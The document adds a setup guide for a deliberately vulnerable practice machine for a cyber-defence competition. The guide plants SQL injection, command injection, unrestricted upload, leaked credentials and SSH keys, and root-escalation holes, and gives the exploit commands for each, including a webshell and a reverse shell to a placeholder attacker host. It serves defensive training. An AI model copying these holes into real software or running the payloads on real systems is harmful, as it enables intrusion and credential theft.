@@ -1,0 +1,608 @@
+# CCDC Practice VM Setup Guide
+# Run every command as root on a fresh Ubuntu 22.04 VM.
+# This guide sets up 6 scorable services with intentional vulnerabilities.
+# Follow each section in order. Do not skip steps.
+
+===============================================================
+SYSTEM OVERVIEW
+===============================================================
+
+Services to install:
+  1. Apache + PHP       (port 80)   - SQLi login page + file leak
+  2. Apache vhost       (port 8080) - Command injection tool
+  3. Flask app          (port 8888) - File upload RCE
+  4. OpenSSH            (port 22)   - Weak credentials
+  5. vsftpd             (port 21)   - Anonymous FTP with credential leak
+  6. Samba              (port 445)  - Null session share with credential leak
+
+Privilege escalation vulnerabilities to plant:
+  1. SUID bit on python3
+  2. Sudo misconfiguration (deploy user can sudo vim with no password)
+  3. World-writable cron script executed by root every minute
+  4. World-writable /etc/passwd
+  5. (bonus if docker is installed) devops user in docker group
+
+===============================================================
+SECTION 1 — INSTALL PACKAGES
+===============================================================
+
+Run:
+  apt-get update
+  apt-get install -y apache2 php php-mysqli libapache2-mod-php mysql-server \
+    vsftpd samba openssh-server python3 python3-pip net-tools curl wget vim cron
+  pip3 install flask
+
+
+===============================================================
+SECTION 2 — MYSQL DATABASE
+===============================================================
+
+Start mysql:
+  systemctl start mysql
+
+Open the mysql shell:
+  mysql
+
+Run these SQL commands inside mysql:
+  CREATE DATABASE webapp;
+  CREATE USER 'webuser'@'localhost' IDENTIFIED BY 'webpass123';
+  GRANT ALL ON webapp.* TO 'webuser'@'localhost';
+  FLUSH PRIVILEGES;
+  USE webapp;
+  CREATE TABLE users (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    username VARCHAR(64),
+    password VARCHAR(64),
+    role VARCHAR(16) DEFAULT 'user'
+  );
+  INSERT INTO users (username, password, role) VALUES
+    ('admin', 'sup3rs3cr3t!', 'admin'),
+    ('john',  'password123',  'user'),
+    ('alice', 'alice2024',    'user');
+  EXIT;
+
+
+===============================================================
+SECTION 3 — APACHE MAIN SITE (port 80)
+===============================================================
+
+--- File: /var/www/html/index.php ---
+Create this file with the following content exactly.
+This is the VULNERABLE SQLi login page.
+
+<?php
+$msg = '';
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $user = $_POST['username'];
+    $pass = $_POST['password'];
+    $conn = new mysqli('localhost', 'webuser', 'webpass123', 'webapp');
+    $sql  = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
+    $res  = $conn->query($sql);
+    if ($res && $res->num_rows > 0) {
+        $row = $res->fetch_assoc();
+        $msg = "<div class='ok'>Welcome, {$row['username']}! Role: {$row['role']}</div>";
+    } else {
+        $msg = "<div class='err'>Invalid credentials.</div>";
+    }
+}
+?>
+<!DOCTYPE html>
+<html>
+<head><title>Welcome to CorpNet Portal</title>
+<style>
+  body{font-family:sans-serif;background:#1a1a2e;color:#eee;display:flex;justify-content:center;padding-top:80px}
+  .box{background:#16213e;padding:40px;border-radius:8px;width:340px}
+  h2{text-align:center;color:#00d4ff}
+  input{width:100%;padding:8px;margin:8px 0;border-radius:4px;border:1px solid #444;background:#0f3460;color:#eee}
+  button{width:100%;padding:10px;background:#00d4ff;color:#000;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
+  .ok{color:#39ff14;margin-top:10px}.err{color:#ff2d78;margin-top:10px}
+</style></head>
+<body>
+<div class="box">
+  <h2>CorpNet Portal</h2>
+  <form method="POST">
+    <input name="username" placeholder="Username">
+    <input name="password" type="password" placeholder="Password">
+    <button type="submit">Login</button>
+  </form>
+  <?= $msg ?>
+</div>
+</body></html>
+
+--- End of /var/www/html/index.php ---
+
+
+--- Backup directory with leaked files ---
+
+Create the backup directory:
+  mkdir -p /var/www/html/backup
+
+Enable directory listing for it by creating /var/www/html/backup/.htaccess:
+  Options +Indexes
+
+Create the leaked database config at /var/www/html/backup/db_config.php.bak:
+  <?php
+  define('DB_HOST', 'localhost');
+  define('DB_USER', 'webuser');
+  define('DB_PASS', 'webpass123');
+  define('DB_NAME', 'webapp');
+  ?>
+
+--- Generate SSH key for devops user and leak it ---
+
+Create the devops user:
+  useradd -m -s /bin/bash devops
+  echo 'devops:devops123' | chpasswd
+
+Generate an SSH keypair for devops:
+  mkdir -p /home/devops/.ssh
+  ssh-keygen -t rsa -b 2048 -f /home/devops/.ssh/id_rsa -N ""
+  cp /home/devops/.ssh/id_rsa.pub /home/devops/.ssh/authorized_keys
+  chmod 600 /home/devops/.ssh/authorized_keys
+  chown -R devops:devops /home/devops/.ssh
+
+Copy the PRIVATE key to the web-exposed backup directory:
+  cp /home/devops/.ssh/id_rsa /var/www/html/backup/id_rsa
+  chmod 644 /var/www/html/backup/id_rsa
+
+Set permissions on the web root:
+  chown -R www-data:www-data /var/www/html
+
+Restart Apache:
+  systemctl restart apache2
+
+Test: browse to http://TARGET/ and http://TARGET/backup/
+The backup directory should show a file listing with id_rsa and db_config.php.bak visible.
+
+
+===============================================================
+SECTION 4 — COMMAND INJECTION APP (port 8080)
+===============================================================
+
+Create the app directory:
+  mkdir -p /opt/netdiag
+
+--- File: /opt/netdiag/index.php ---
+Create this file with the following content exactly.
+This is the VULNERABLE command injection page.
+
+<?php
+$output = '';
+if (isset($_GET['host']) && $_GET['host'] !== '') {
+    $host   = $_GET['host'];
+    $output = shell_exec("ping -c 2 " . $host . " 2>&1");
+}
+?>
+<!DOCTYPE html>
+<html>
+<head><title>Network Diagnostics</title>
+<style>
+  body{font-family:monospace;background:#0d1117;color:#c8f0ff;padding:40px}
+  h1{color:#00d4ff}
+  input{padding:8px;width:320px;background:#161b22;border:1px solid #30363d;color:#fff;border-radius:4px}
+  button{padding:8px 20px;background:#00d4ff;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
+  pre{background:#161b22;padding:20px;border-radius:4px;margin-top:20px;white-space:pre-wrap}
+</style></head>
+<body>
+<h1>Network Diagnostics Tool</h1>
+<form method="GET">
+  <input name="host" placeholder="Enter hostname or IP">
+  <button type="submit">Ping</button>
+</form>
+<?php if ($output): ?>
+<pre><?= htmlspecialchars($output) ?></pre>
+<?php endif; ?>
+</body></html>
+
+--- End of /opt/netdiag/index.php ---
+
+Set permissions:
+  chown -R www-data:www-data /opt/netdiag
+
+Add port 8080 to Apache. Edit /etc/apache2/ports.conf and add this line:
+  Listen 8080
+
+Create /etc/apache2/sites-available/netdiag.conf with this content:
+  <VirtualHost *:8080>
+      DocumentRoot /opt/netdiag
+      <Directory /opt/netdiag>
+          Options Indexes FollowSymLinks
+          AllowOverride None
+          Require all granted
+      </Directory>
+  </VirtualHost>
+
+Enable the site:
+  a2ensite netdiag.conf
+  systemctl restart apache2
+
+Test: browse to http://TARGET:8080/
+Enter "127.0.0.1; whoami" in the field. You should see "www-data" in the output.
+
+
+===============================================================
+SECTION 5 — FILE UPLOAD RCE APP (port 8888)
+===============================================================
+
+Create the app directory:
+  mkdir -p /opt/uploadapp/uploads
+  chown -R www-data:www-data /opt/uploadapp
+
+--- File: /opt/uploadapp/app.py ---
+Create this file with the following content exactly.
+This is the VULNERABLE file upload app with no extension validation.
+
+from flask import Flask, request, redirect, send_from_directory
+import os
+
+app = Flask(__name__)
+UPLOAD_FOLDER = '/opt/uploadapp/uploads'
+app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
+
+@app.route('/')
+def index():
+    files = os.listdir(UPLOAD_FOLDER)
+    file_list = ''.join(f'<li><a href="/uploads/{f}">{f}</a></li>' for f in files)
+    return f'''<!DOCTYPE html>
+<html><head><title>CorpNet Image Gallery</title>
+<style>
+  body{{font-family:sans-serif;background:#0d1117;color:#c8f0ff;padding:40px}}
+  h1{{color:#00d4ff}}
+  input,button{{margin:4px;padding:8px}}
+  button{{background:#00d4ff;border:none;border-radius:4px;cursor:pointer;font-weight:bold}}
+</style></head>
+<body>
+<h1>Upload Profile Image</h1>
+<form method="POST" action="/upload" enctype="multipart/form-data">
+  <input type="file" name="file">
+  <button type="submit">Upload</button>
+</form>
+<h2>Uploaded Files</h2>
+<ul>{file_list}</ul>
+</body></html>'''
+
+@app.route('/upload', methods=['POST'])
+def upload():
+    f = request.files.get('file')
+    if f:
+        f.save(os.path.join(app.config['UPLOAD_FOLDER'], f.filename))
+    return redirect('/')
+
+@app.route('/uploads/<path:filename>')
+def uploaded_file(filename):
+    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8888, debug=False)
+
+--- End of /opt/uploadapp/app.py ---
+
+Create a systemd service so it starts automatically.
+Create /etc/systemd/system/uploadapp.service with this content:
+
+  [Unit]
+  Description=CorpNet Upload App
+  After=network.target
+
+  [Service]
+  User=www-data
+  WorkingDirectory=/opt/uploadapp
+  ExecStart=/usr/bin/python3 /opt/uploadapp/app.py
+  Restart=always
+
+  [Install]
+  WantedBy=multi-user.target
+
+Enable and start it:
+  systemctl daemon-reload
+  systemctl enable uploadapp
+  systemctl start uploadapp
+
+Test: browse to http://TARGET:8888/
+Upload a file named shell.php with content: <?php system($_GET['cmd']); ?>
+Then browse to http://TARGET:8888/uploads/shell.php?cmd=whoami
+You should see "www-data".
+
+NOTE: The Flask app does NOT execute PHP files itself. For PHP execution via Flask
+you would need to proxy through Apache. If you want this to work out of the box,
+run the upload app on Apache instead — create /opt/uploadapp as a PHP app with
+move_uploaded_file() and no extension checks, served on port 8888 via Apache vhost.
+The simpler approach: make the app a PHP app, not Flask.
+
+Alternative PHP upload app — replace app.py with this Apache+PHP setup:
+
+Create /opt/uploadapp/index.php:
+
+<?php
+$msg = '';
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
+    $dest = __DIR__ . '/uploads/' . basename($_FILES['file']['name']);
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
+        $msg = "Uploaded: <a href='uploads/" . htmlspecialchars($_FILES['file']['name']) . "'>" . htmlspecialchars($_FILES['file']['name']) . "</a>";
+    }
+}
+$files = array_diff(scandir(__DIR__ . '/uploads'), ['.', '..']);
+$list  = implode('', array_map(fn($f) => "<li><a href='uploads/$f'>$f</a></li>", $files));
+?>
+<!DOCTYPE html>
+<html><head><title>CorpNet Image Gallery</title>
+<style>
+  body{font-family:sans-serif;background:#0d1117;color:#c8f0ff;padding:40px}
+  h1{color:#00d4ff} input,button{margin:4px;padding:8px}
+  button{background:#00d4ff;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
+</style></head>
+<body>
+<h1>Upload Profile Image</h1>
+<form method="POST" enctype="multipart/form-data">
+  <input type="file" name="file">
+  <button type="submit">Upload</button>
+</form>
+<?= $msg ? "<p>$msg</p>" : '' ?>
+<h2>Uploaded Files</h2><ul><?= $list ?></ul>
+</body></html>
+
+Create /etc/apache2/sites-available/uploadapp.conf:
+
+  Listen 8888
+  <VirtualHost *:8888>
+      DocumentRoot /opt/uploadapp
+      <Directory /opt/uploadapp>
+          Options Indexes FollowSymLinks
+          AllowOverride None
+          Require all granted
+      </Directory>
+  </VirtualHost>
+
+Enable it:
+  mkdir -p /opt/uploadapp/uploads
+  chown -R www-data:www-data /opt/uploadapp
+  a2ensite uploadapp.conf
+  systemctl restart apache2
+
+
+===============================================================
+SECTION 6 — FTP ANONYMOUS LOGIN (port 21)
+===============================================================
+
+Replace /etc/vsftpd.conf with:
+
+  listen=YES
+  listen_ipv6=NO
+  anonymous_enable=YES
+  anon_root=/srv/ftp
+  local_enable=YES
+  write_enable=NO
+  local_umask=022
+  dirmessage_enable=YES
+  use_localtime=YES
+  xferlog_enable=YES
+  connect_from_port_20=YES
+  secure_chroot_dir=/var/run/vsftpd/empty
+  pam_service_name=vsftpd
+
+Create the FTP root and drop a credential file in it:
+  mkdir -p /srv/ftp
+  chmod 755 /srv/ftp
+
+Create /srv/ftp/README.txt with this content:
+  CorpNet Internal FTP
+  ====================
+  Deployment credentials (do not share):
+    ssh_user: deploy
+    ssh_pass: deploy
+
+  DB backup available at: http://TARGET/backup/db_config.php.bak
+  SSH key for devops:      http://TARGET/backup/id_rsa
+
+Create the deploy user (weak password matching username):
+  useradd -m -s /bin/bash deploy
+  echo 'deploy:deploy' | chpasswd
+
+Restart vsftpd:
+  systemctl restart vsftpd
+
+Test: ftp TARGET (use "anonymous" as username, blank password)
+You should be able to list and download README.txt.
+
+
+===============================================================
+SECTION 7 — SAMBA NULL SESSION (port 445)
+===============================================================
+
+Append to /etc/samba/smb.conf:
+
+  [corpshare]
+     path = /srv/samba/corpshare
+     browseable = yes
+     read only = yes
+     guest ok = yes
+     comment = CorpNet Shared Files
+
+Create the share and drop a credential file:
+  mkdir -p /srv/samba/corpshare
+  chmod 755 /srv/samba/corpshare
+
+Create /srv/samba/corpshare/internal_notes.txt:
+  IT Admin Notes
+  ==============
+  Default root password changed to: R00tM3N0w!
+  devops SSH key stored at: /var/www/html/backup/id_rsa
+  MySQL root is passwordless (localhost only)
+  deploy user SSH password: deploy
+
+  chmod 644 /srv/samba/corpshare/internal_notes.txt
+
+Restart Samba:
+  systemctl restart smbd nmbd
+
+Test: smbclient //TARGET/corpshare -N
+You should see internal_notes.txt without providing a password.
+
+
+===============================================================
+SECTION 8 — PRIVILEGE ESCALATION VULNERABILITIES
+===============================================================
+
+--- PrivEsc 1: SUID python3 ---
+  chmod u+s /usr/bin/python3
+
+Exploit: python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+--- PrivEsc 2: Sudo misconfiguration ---
+Add these lines to /etc/sudoers (use visudo or append carefully):
+  deploy ALL=(ALL) NOPASSWD: /usr/bin/vim
+  www-data ALL=(ALL) NOPASSWD: /usr/bin/python3
+
+Exploit for deploy: sudo vim -c ':!/bin/bash'
+Exploit for www-data: sudo python3 -c 'import os; os.system("/bin/bash")'
+
+--- PrivEsc 3: World-writable cron script ---
+  mkdir -p /opt/scripts
+
+Create /opt/scripts/cleanup.sh:
+  #!/bin/bash
+  find /tmp -type f -mtime +1 -delete
+
+Make it writable by everyone and run it as root every minute:
+  chmod 777 /opt/scripts/cleanup.sh
+
+Create /etc/cron.d/cleanup with:
+  * * * * * root /opt/scripts/cleanup.sh
+
+Exploit: echo 'cp /bin/bash /tmp/bash; chmod u+s /tmp/bash' >> /opt/scripts/cleanup.sh
+Wait 1 minute, then: /tmp/bash -p
+
+--- PrivEsc 4: World-writable /etc/passwd ---
+  chmod 666 /etc/passwd
+
+Exploit: echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd
+Then: su pwned (no password needed, gets root shell)
+
+--- PrivEsc 5 (bonus): Docker socket ---
+If docker is installed:
+  usermod -aG docker deploy
+  usermod -aG docker devops
+
+Exploit: docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+
+
+===============================================================
+SECTION 9 — VERIFY ALL SERVICES
+===============================================================
+
+Check all services are running:
+  systemctl status apache2
+  systemctl status vsftpd
+  systemctl status smbd
+  systemctl status ssh
+  systemctl status uploadapp   (if using Flask) OR check Apache on 8888
+
+Check ports are listening:
+  ss -tlnp | grep -E '21|22|80|445|8080|8888'
+
+Quick functional tests:
+  curl http://localhost/                   -> should return HTML with "CorpNet Portal"
+  curl http://localhost/backup/            -> should return directory listing
+  curl http://localhost/backup/id_rsa      -> should return RSA private key
+  curl "http://localhost:8080/?host=127.0.0.1;whoami"  -> should show www-data
+  curl http://localhost:8888/              -> should return HTML with "Upload"
+  ftp localhost                            -> login as anonymous, list files
+
+
+===============================================================
+SECTION 10 — SCORING APP PROFILE CONFIGURATION
+===============================================================
+
+In the CCDC scoring web app (Admin -> Profiles -> New Profile):
+
+Profile name: CorpNet Box
+
+Add these 7 applications to the profile:
+
+App 1 — Apache Main Site
+  Type:             HTTP
+  Port:             80
+  URL Path:         /
+  Response contains: Welcome
+  Points per check:  100
+  Penalty:           50
+  Interval:          60
+
+App 2 — SSH Service
+  Type:             SSH
+  Port:             22
+  SSH User:         deploy
+  SSH Password:     deploy
+  Points per check:  150
+  Penalty:           75
+  Interval:          60
+
+App 3 — FTP Banner
+  Type:             TCP
+  Port:             21
+  Response contains: 220
+  Points per check:  75
+  Penalty:           25
+  Interval:          60
+
+App 4 — Samba
+  Type:             TCP
+  Port:             445
+  Response contains: (leave blank)
+  Points per check:  75
+  Penalty:           25
+  Interval:          60
+
+App 5 — Network Diagnostics (cmd injection)
+  Type:             HTTP
+  Port:             8080
+  URL Path:         /
+  Response contains: Network Diagnostics
+  Points per check:  100
+  Penalty:           50
+  Interval:          60
+
+App 6 — Image Gallery (file upload)
+  Type:             HTTP
+  Port:             8888
+  URL Path:         /
+  Response contains: Upload
+  Points per check:  100
+  Penalty:           50
+  Interval:          60
+
+App 7 — Backup Directory (file leak)
+  Type:             HTTP
+  Port:             80
+  URL Path:         /backup/
+  Response contains: Index of
+  Points per check:  75
+  Penalty:           25
+  Interval:          60
+
+After saving the profile:
+  Go to Admin -> Instances -> New Instance
+  For each team:
+    - Select profile: CorpNet Box
+    - Set IP to that team's machine IP
+    - Assign to the correct team
+
+
+===============================================================
+ATTACK CHAIN CHEAT SHEET (for players / scoring reference)
+===============================================================
+
+INITIAL ACCESS:
+  A. FTP anonymous -> download README.txt -> SSH as deploy:deploy
+  B. Browse /backup/id_rsa -> chmod 600 id_rsa -> ssh -i id_rsa devops@TARGET
+  C. SQLi on port 80 -> ' OR '1'='1 -> admin login; advanced: INTO OUTFILE webshell
+  D. Samba null session -> read internal_notes.txt -> SSH as root with R00tM3N0w!
+  E. Port 8080 -> host field -> ; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
+  F. Port 8888 -> upload shell.php -> browse to /uploads/shell.php?cmd=id
+
+PRIVILEGE ESCALATION (from any foothold):
+  1. find / -perm -4000 2>/dev/null -> spot python3 -> setuid exploit
+  2. sudo -l -> vim NOPASSWD -> sudo vim -c ':!/bin/bash'
+  3. ls -la /opt/scripts/cleanup.sh -> world writable -> inject reverse shell -> wait 1 min
+  4. ls -la /etc/passwd -> world writable -> append root user -> su
+  5. id -> docker group -> docker escape to root
